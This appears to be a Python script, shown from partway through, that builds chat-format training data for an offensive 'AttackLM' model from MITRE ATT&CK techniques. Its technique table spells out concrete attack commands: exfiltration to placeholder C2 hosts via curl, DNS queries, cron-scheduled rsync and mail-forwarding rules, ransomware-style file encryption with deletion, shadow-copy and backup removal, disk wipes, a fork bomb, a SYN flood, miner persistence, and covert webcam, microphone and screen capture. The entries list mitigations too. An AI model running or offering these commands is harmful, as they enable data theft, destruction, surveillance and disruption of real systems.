            "tools": ["7z", "tar", "rar", "PowerShell Compress-Archive"],
            "mitigations": [
                "Monitor archive creation on endpoints",
                "DLP for mass file operations",
                "Unusual process behavior detection",
            ],
        },
        {
            "id": "T1005",
            "name": "Data from Local System",
            "sub": [],
            "desc": "Adversaries collect data from local systems.",
            "steps": "1. Search for documents: `find / -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf' 2>/dev/null`\n2. Browser data: `copy C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History`\n3. Email data: `copy C:\\Users\\*\\AppData\\Local\\Microsoft\\Outlook\\*.pst`\n4. Configuration files: `find /etc -name '*.conf' -exec cat {} \\;`",
            "tools": ["find", "copy/xcopy", "robocopy", "rsync"],
            "mitigations": [
                "File access monitoring",
                "DLP controls",
                "Data classification",
                "Access controls on sensitive directories",
            ],
        },
        {
            "id": "T1113",
            "name": "Screen Capture",
            "sub": [],
            "desc": "Adversaries capture screenshots to collect visual information during security testing.",
            "steps": "1. Windows screenshot: `[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')` or `powershell -command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens\"`\n2. Linux screenshot: `import -window root /tmp/screenshot.png`\n3. macOS screenshot: `screencapture -x /tmp/screenshot.png`\n4. Automated periodic capture: `while true; do import -window root /tmp/screen_$(date +%s).png; sleep 60; done`",
            "tools": [
                "screencapture",
                "import (ImageMagick)",
                "PowerShell screenshot",
                "Scrot",
            ],
            "mitigations": [
                "Screen capture monitoring",
                "DLP for clipboard data",
                "Endpoint detection for screenshot tools",
                "Display isolation for sensitive applications",
            ],
        },
        {
            "id": "T1123",
            "name": "Audio Capture",
            "sub": [],
            "desc": "Adversaries capture audio from microphones during security testing.",
            "steps": '1. Windows audio: `powershell -command "Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine; $rec.SetInputToDefaultAudioDevice()"`\n2. Linux audio: `arecord -d 60 -f cd /tmp/recording.wav`\n3. macOS audio: `sox -d /tmp/recording.wav` (SoX recording)\n4. Scheduled capture: `ffmpeg -f alsa -i default -t 3600 /tmp/audio_$(date +%s).mp3`',
            "tools": ["arecord", "SoX", "ffmpeg", "Windows Speech API"],
            "mitigations": [
                "Microphone access controls",
                "Endpoint monitoring for audio capture",
                "Physical microphone indicators",
                "Application permission for mic access",
            ],
        },
        {
            "id": "T1125",
            "name": "Video Capture",
            "sub": [],
            "desc": "Adversaries capture video from webcams during security testing.",
            "steps": "1. Linux webcam capture: `ffmpeg -f v4l2 -i /dev/video0 -t 60 /tmp/webcam.avi`\n2. Windows webcam: PowerShell with Windows.Media.Capture API\n3. macOS webcam: `imagesnap -w 5 /tmp/webcam.jpg` for snapshot\n4. Stream to file: `ffmpeg -f v4l2 -framerate 30 -i /dev/video0 -t 300 /tmp/stream.mkv`",
            "tools": ["ffmpeg", "imagesnap", "Windows Media Capture", "OpenCV"],
            "mitigations": [
                "Webcam access controls and indicators",
                "Endpoint monitoring for video capture",
                "Camera kill switches",
                "Application permission enforcement",
            ],
        },
        {
            "id": "T1114",
            "name": "Email Collection",
            "sub": ["T1114.001", "T1114.002", "T1114.003"],
            "desc": "Adversaries collect email data from target systems during security testing.",
            "steps": '1. Outlook PST extraction: `copy C:\\Users\\*\\AppData\\Local\\Microsoft\\Outlook\\*.pst \\\\<exfil>\\share\\`\n2. Exchange mailbox dump: `New-MailboxExportRequest -Mailbox <user> -FilePath \\\\<server>\\share\\<user>.pst`\n3. Email forwarding rule: `New-InboxRule -Name "Forward" -ForwardTo <attacker@domain> -FromContains "@"`\n4. OST extraction: `python3 ost2csv.py /path/to/user.ost`',
            "tools": ["Outlook", "Exchange PowerShell", "ost2csv", "PST walker"],
            "mitigations": [
                "Email DLP and exfiltration controls",
                "Monitor for forwarding rule creation",
                "Email access auditing",
                "MFA for email access",
            ],
        },
    ],
    "exfiltration": [
        {
            "id": "T1041",
            "name": "Exfiltration Over C2 Channel",
            "sub": [],
            "desc": "Adversaries exfiltrate data over an existing C2 channel.",
            "steps": "1. HTTP exfiltration: `curl -X POST -d @/tmp/data.zip http://<c2>/upload`\n2. DNS exfiltration: `dnscat2 --domain <domain> --exec 'cat /tmp/data.bin | base64 | split -b 60 -'`\n3. HTTPS POST: `python3 exfil_https.py --file data.zip --url https://<c2>/api/upload`\n4. ICMP tunnel: `ping -c 1 -s 65507 <c2_ip>  # with embedded data`",
            "tools": ["curl", "dnscat2", "ICMP tunneling", "HTTP/HTTPS C2"],
            "mitigations": [
                "Network traffic analysis",
                "DNS query length monitoring",
                "Data transfer size thresholds",
                "Egress filtering",
            ],
        },
        {
            "id": "T1048",
            "name": "Exfiltration Over Alternative Protocol",
            "sub": ["T1048.001", "T1048.002", "T1048.003"],
            "desc": "Adversaries exfiltrate data using protocols different from the C2 channel.",
            "steps": "1. DNS exfiltration: encode data as DNS queries: `for chunk in $(cat data.bin | base64 | fold -w 60); do nslookup $chunk.<domain>; done`\n2. HTTPS to cloud: `aws s3 cp /tmp/data.zip s3://<bucket>/`\n3. ICMP tunnel: `ptunnel -p <proxy_ip> -lp 1080 -da <dest_ip> -dp 22`\n4. Steganography: `steghide embed -cf cover.jpg -ef data.zip -p <password>`",
            "tools": ["nslookup", "aws cli", "ptunnel", "steghide", "DNSExfiltrator"],
            "mitigations": [
                "DNS anomaly detection",
                "Cloud storage monitoring",
                "ICMP payload inspection",
                "Network DLP",
            ],
        },
        {
            "id": "T1567",
            "name": "Exfiltration Over Web Service",
            "sub": ["T1567.001", "T1567.002"],
            "desc": "Adversaries exfiltrate data to legitimate web services during security testing.",
            "steps": "1. Cloud storage exfiltration: `rclone copy /sensitive/ remote:bucket/`\n2. Web upload: `curl -F 'file=@data.zip' https://file.io`\n3. GitHub exfiltration: `git init && git remote add origin https://github.com/<user>/private-repo && git push`\n4. Social media steganography: embed data in image metadata and upload",
            "tools": ["rclone", "curl", "git", "AWS CLI", "Dropbox API"],
            "mitigations": [
                "Web service traffic monitoring",
                "Cloud storage DLP",
                "Egress proxy filtering",
                "API usage anomaly detection",
            ],
        },
        {
            "id": "T1052",
            "name": "Exfiltration Over Physical Medium",
            "sub": ["T1052.001"],
            "desc": "Adversaries exfiltrate data via physical media such as USB drives during security testing.",
            "steps": "1. USB data staging: `robocopy C:\\Sensitive\\ E:\\exfil\\ /s /copyall`\n2. Linux USB: `rsync -av /sensitive/ /media/usb/exfil/`\n3. Burn to optical media: `cdrecord -v dev=/dev/cdrom data.iso`\n4. Physical print exfiltration: redirect sensitive documents to network printer for pickup",
            "tools": ["robocopy", "rsync", "cdrecord", "dd", "USB storage"],
            "mitigations": [
                "USB device controls (block mass storage)",
                "DLP endpoint agents",
                "Physical security policies",
                "Port security (802.1X)",
            ],
        },
        {
            "id": "T1020",
            "name": "Automated Exfiltration",
            "sub": ["T1020.001"],
            "desc": "Adversaries use automated scheduled transfers to exfiltrate data during security testing.",
            "steps": "1. Scheduled rsync: `echo '0 2 * * * rsync -avz /sensitive/ <c2>:/backup/' >> /etc/crontab`\n2. BITS transfer: `bitsadmin /transfer exfil /download /priority normal http://<c2>/job C:\\temp\\exfil.cmd`\n3. Automated cloud sync: configure rclone to sync at scheduled intervals\n4. Scripted exfiltration: `python3 auto_exfil.py --schedule '0 3 * * *' --src /data/ --dst s3://bucket/`",
            "tools": [
                "cron",
                "bitsadmin",
                "rclone",
                "Task Scheduler",
                "systemd timers",
            ],
            "mitigations": [
                "Scheduled task auditing",
                "Network transfer monitoring",
                "DLP for automated uploads",
                "Egress filtering with size thresholds",
            ],
        },
    ],
    "impact": [
        {
            "id": "T1486",
            "name": "Data Encrypted for Impact",
            "sub": [],
            "desc": "Adversaries encrypt data on target systems to cause impact.",
            "steps": "1. Identify target files: `find / -name '*.docx' -o -name '*.xlsx' -o -name '*.pdf' 2>/dev/null > /tmp/targets.txt`\n2. Encrypt files (simulated): `for f in $(cat /tmp/targets.txt); do openssl enc -aes-256-cbc -in $f -out $f.enc -k <key>; rm $f; done`\n3. Deploy ransom note: `echo 'Your files have been encrypted...' > README_DECRYPT.txt`\n4. Key management: generate per-victim key and exfiltrate to C2",
            "tools": ["openssl", "GPG", "custom ransomware simulators"],
            "mitigations": [
                "Offline backups",
                "File integrity monitoring",
                "Endpoint detection",
                "Network segmentation",
            ],
        },
        {
            "id": "T1489",
            "name": "Service Stop",
            "sub": [],
            "desc": "Adversaries stop or disable services to cause disruption.",
            "steps": "1. Stop Windows service: `sc stop <service> && sc config <service> start= disabled`\n2. Stop Linux service: `systemctl stop <service> && systemctl disable <service>`\n3. Kill processes: `taskkill /F /IM <process>` or `kill -9 $(pgrep <process>)`\n4. Disable startup: `mv /etc/init.d/<service> /tmp/`",
            "tools": ["sc.exe", "systemctl", "taskkill", "kill", "net stop"],
            "mitigations": [
                "Service monitoring",
                "Auto-restart policies",
                "Privileged access restrictions",
            ],
        },
        {
            "id": "T1485",
            "name": "Data Destruction",
            "sub": [],
            "desc": "Adversaries destroy data on target systems to cause impact during security testing.",
            "steps": "1. Secure file deletion: `shred -vfz -n 10 /sensitive/data/*`\n2. Database destruction (simulated): `DROP DATABASE production;`\n3. Volume shadow deletion: `vssadmin delete shadows /all /quiet`\n4. Recursive deletion: `rm -rf /critical/data/` or `rd /s /q C:\\Critical\\Data\\`",
            "tools": ["shred", "vssadmin", "rm", "rd", "DROP TABLE"],
            "mitigations": [
                "Offline and immutable backups",
                "Volume Shadow Copy protection",
                "File integrity monitoring",
                "Database replication",
            ],
        },
        {
            "id": "T1561",
            "name": "Disk Wipe",
            "sub": ["T1561.001", "T1561.002"],
            "desc": "Adversaries wipe disk contents to cause maximum impact during security testing.",
            "steps": "1. Full disk wipe: `dd if=/dev/zero of=/dev/sda bs=1M`\n2. MBR wipe: `dd if=/dev/zero of=/dev/sda bs=446 count=1`\n3. Partition table destruction: `dd if=/dev/urandom of=/dev/sda bs=512 count=1`\n4. Windows diskpart: `diskpart → select disk 0 → clean`",
            "tools": ["dd", "diskpart", "shred", "mkfs", "format"],
            "mitigations": [
                "Immutable backups",
                "Disk encryption with key management",
                "Firmware-level protection",
                "Boot integrity verification",
            ],
        },
        {
            "id": "T1490",
            "name": "Inhibit System Recovery",
            "sub": [],
            "desc": "Adversaries inhibit system recovery mechanisms to maximize impact during security testing.",
            "steps": "1. Delete volume shadows: `vssadmin delete shadows /all /quiet`\n2. Disable Windows recovery: `bcdedit /set recoveryenabled No` and `reagentc /disable`\n3. Delete backup catalogs: `wbadmin delete catalog -quiet`\n4. Remove Linux backups: `rm -rf /var/backups/* /etc/backup/*`",
            "tools": ["vssadmin", "bcdedit", "wbadmin", "reagentc"],
            "mitigations": [
                "Immutable backups (WORM storage)",
                "Backup catalog protection",
                "Recovery partition monitoring",
                "Air-gapped backup copies",
            ],
        },
        {
            "id": "T1496",
            "name": "Resource Hijacking",
            "sub": [],
            "desc": "Adversaries hijack system resources for cryptocurrency mining or other purposes during security testing.",
            "steps": "1. Deploy crypto miner: `xmrig --url <pool> --user <wallet> --pass <password> -t 4`\n2. Container resource hijacking: `docker run --cpus=4 <miner_image>`\n3. Cloud compute hijacking: launch instances with GPU for mining\n4. Persistence: `echo '@reboot /opt/xmrig/xmrig --url <pool>' >> /var/spool/cron/root`",
            "tools": ["XMRig", "cryptocurrency miners", "docker", "cloud CLI"],
            "mitigations": [
                "Resource usage monitoring and alerting",
                "Container resource limits",
                "Cloud cost anomaly detection",
                "Process monitoring for known miners",
            ],
        },
        {
            "id": "T1499",
            "name": "Endpoint Denial of Service",
            "sub": ["T1499.001", "T1499.002", "T1499.003"],
            "desc": "Adversaries disrupt availability of endpoints through denial of service during security testing.",
            "steps": "1. SYN flood (testing): `hping3 -S -p 80 --flood <target>`\n2. HTTP layer DoS: `slowloris <target> -p 80 -t 200`\n3. Application crash: trigger vulnerability that causes service crash\n4. Resource exhaustion: `fork bomb` - `:(){ :|:& };:` (Linux)",
            "tools": ["hping3", "slowloris", "GoldenEye", "LOIC", "ab (Apache Bench)"],
            "mitigations": [
                "Rate limiting and WAF",
                "DDoS protection services",
                "Load balancing",
                "Auto-scaling policies",
                "Connection limits",
            ],
        },
    ],
}


def try_download_hf_dataset() -> list[dict] | None:
    """Attempt to download the RED_team_tactics_dataset from HuggingFace."""
    try:
        from datasets import load_dataset

        print("Downloading RED_team_tactics_dataset from HuggingFace...")
        ds = load_dataset("darkknight25/RED_team_tactics_dataset", split="train")
        print(f"Downloaded {len(ds)} records from HuggingFace.")

        pairs: list[dict] = []
        for row in ds:
            tactic_id = str(row.get("tactic_id", row.get("tactic", "")))
            tactic_name = str(row.get("tactic_name", row.get("tactic", "")))
            technique = str(row.get("mitre_technique", row.get("technique", "")))
            description = str(row.get("description", ""))
            execution_steps = str(row.get("execution_steps", row.get("steps", "")))
            tools = row.get("tools", "")
            mitigations = row.get("mitigations", "")

            mitre_ids = [technique] if technique else []

            assistant = f"**Technique: {technique}**\n\n"
            assistant += f"**Tactic: {tactic_name} ({tactic_id})**\n\n"
            assistant += f"**Description:** {description}\n\n"
            if execution_steps:
                assistant += f"**Execution Steps:**\n```\n{execution_steps}\n```\n\n"
            if tools:
                if isinstance(tools, str):
                    assistant += f"**Tools:** {tools}\n\n"
                elif isinstance(tools, list):
                    assistant += f"**Tools:** {', '.join(str(t) for t in tools)}\n\n"
            if mitigations:
                assistant += f"**Mitigations:** {mitigations}\n"

            user = f"Explain {technique} within {tactic_name} ({tactic_id}). Include execution steps, tools, and mitigations."

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                }
            )
        return pairs if pairs else None
    except Exception as e:
        print(f"HuggingFace download failed: {e}")
        print("Falling back to synthetic generation...")
        return None


def generate_synthetic_pairs(count: int | None = None) -> list[dict]:
    """Generate synthetic red team tactics training pairs from built-in templates.

    Uses combinatorial expansion with environment types, severity levels, and
    testing frameworks for richer question diversity.
    """
    random.seed(SEED)
    pairs: list[dict] = []

    for tactic_key, techniques in TACTIC_TECHNIQUES.items():
        tactic_id, tactic_name = TACTIC_MAP.get(
            tactic_key, ("TA????", tactic_key.replace("_", " ").title())
        )

        for tech in techniques:
            mitre_ids = [tech["id"]] + tech.get("sub", [])

            for env_type in ENVIRONMENT_TYPES:
                for severity in SEVERITY_LEVELS:
                    for framework in TESTING_FRAMEWORKS:
                        n_variants = random.randint(1, 2)
                        eligible_templates = [
                            t
                            for t in QUESTION_TEMPLATES
                            if all(
                                k in t
                                for k in (
                                    "{technique_id}",
                                    "{technique_name}",
                                    "{tactic_name}",
                                    "{tactic_id}",
                                    "{environment_type}",
                                    "{severity_level}",
                                    "{framework}",
                                )
                            )
                        ]
                        if not eligible_templates:
                            eligible_templates = QUESTION_TEMPLATES[:8]

                        chosen_templates = random.sample(
                            eligible_templates,
                            min(n_variants, len(eligible_templates)),
                        )

                        for q_template in chosen_templates:
                            try:
                                user = q_template.format(
                                    tactic_name=tactic_name,
                                    tactic_id=tactic_id,
                                    technique_id=tech["id"],
                                    technique_name=tech["name"],
                                    environment_type=env_type,
                                    severity_level=severity,
                                    framework=framework,
                                )
                            except KeyError:
                                user = q_template.format(
                                    tactic_name=tactic_name,
                                    tactic_id=tactic_id,
                                    technique_id=tech["id"],
                                    technique_name=tech["name"],
                                )

                            assistant = (
                                f"**Technique: {tech['name']} ({tech['id']})**\n\n"
                            )
                            assistant += f"**Tactic:** {tactic_name} ({tactic_id})\n\n"
                            assistant += f"**Description:** {tech['desc']}\n\n"
                            assistant += f"**Execution Steps:**\n{tech['steps']}\n\n"

                            if tech.get("tools"):
                                tools_str = ", ".join(tech["tools"])
                                assistant += f"**Tools:** {tools_str}\n\n"
                            if tech.get("mitigations"):
                                mitigations_str = ", ".join(tech["mitigations"])
                                assistant += f"**Mitigations:** {mitigations_str}\n\n"

                            assistant += (
                                f"**Context:** {env_type} | "
                                f"Severity: {severity} | "
                                f"Framework: {framework}\n"
                            )

                            pairs.append(
                                {
                                    "messages": [
                                        {
                                            "role": "system",
                                            "content": SYSTEM_PROMPT,
                                        },
                                        {
                                            "role": "user",
                                            "content": user,
                                        },
                                        {
                                            "role": "assistant",
                                            "content": assistant.strip(),
                                        },
                                    ],
                                    "mitre_ids": mitre_ids,
                                    "source": SOURCE_NAME,
                                    "license": LICENSE,
                                }
                            )

    random.shuffle(pairs)

    if count is not None and count > 0:
        pairs = pairs[:count]

    return pairs


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Acquire RED Team Tactics dataset for AttackLM"
    )
    parser.add_argument(
        "--fallback",
        action="store_true",
        help="Skip HuggingFace download, use synthetic generation",
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of synthetic pairs to generate (default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = None
    if not args.fallback:
        pairs = try_download_hf_dataset()

    if pairs is None:
        pairs = generate_synthetic_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "red_team_tactics",
        "display_name": "Red Team Tactics",
        "category": "attack_tactics",
        "mitre_tactic": "TA0000",
        "description": f"Red team tactics dataset covering {len(unique_mitre)} MITRE techniques across all tactics. Synthetic + HF source. Contextual variables: {len(ENVIRONMENT_TYPES)} environment types, {len(SEVERITY_LEVELS)} severity levels, {len(TESTING_FRAMEWORKS)} frameworks.",
        "source_file": data_file.name,
        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nRed Team Tactics dataset acquired:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  MITRE IDs: {len(unique_mitre)}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
